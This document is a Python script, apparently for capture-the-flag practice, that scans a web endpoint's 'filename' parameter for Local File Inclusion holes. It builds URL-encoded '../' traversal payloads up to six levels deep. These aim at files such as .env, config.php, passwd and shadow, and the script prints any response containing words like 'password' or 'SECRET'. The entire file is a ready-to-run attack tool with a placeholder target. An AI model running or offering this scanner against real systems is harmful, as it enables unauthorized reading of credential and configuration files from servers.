
#!/usr/bin/env python3
"""
LFI Fuzzer Script - Smart automated scanner for Local File Inclusion vulnerabilities.
"""

import requests
from urllib.parse import quote

# === CONFIGURATION ===
# Set this to your target URL that takes a 'filename' parameter
TARGET_URL = "https://example.com/dog?filename="  # 🔁 Replace with the real target

# Keywords to look for in the response that indicate a successful LFI read
MATCH_KEYWORDS = ["flag", "key", "password", "Liber8", "{", "SKY-", "SECRET"]

# Maximum number of '../' directory traversal attempts
MAX_DEPTH = 6

# Common filenames used in CTFs and real apps to store sensitive info
FILENAMES = [
    "flag.txt",
    "secret.txt",
    "key.txt",
    ".env",
    "config.php",
    "index.php",
    "passwd",
    "shadow",
]

# === FUNCTION TO GENERATE LFI PAYLOADS ===
def generate_payloads():
    payloads = []
    for depth in range(1, MAX_DEPTH + 1):
        prefix = "../" * depth
        for fname in FILENAMES:
            payloads.append(quote(prefix + fname))  # URL-encode the payload
    return payloads

# === MAIN SCANNING FUNCTION ===
def test_payloads():
    print("[*] Starting LFI scan on:", TARGET_URL)
    for payload in generate_payloads():
        url = TARGET_URL + payload
        try:
            response = requests.get(url, timeout=5)
            text = response.text.strip()

            # Look for any match keywords in the response content
            if any(keyword.lower() in text.lower() for keyword in MATCH_KEYWORDS):
                print(f"🚩 Possible match for {payload}:")
                print("-" * 60)
                print(text[:500])  # show first 500 chars of result
                print("-" * 60)
        except Exception as e:
            print(f"[!] Error with payload {payload}: {e}")

# === ENTRY POINT ===
if __name__ == "__main__":
    test_payloads()
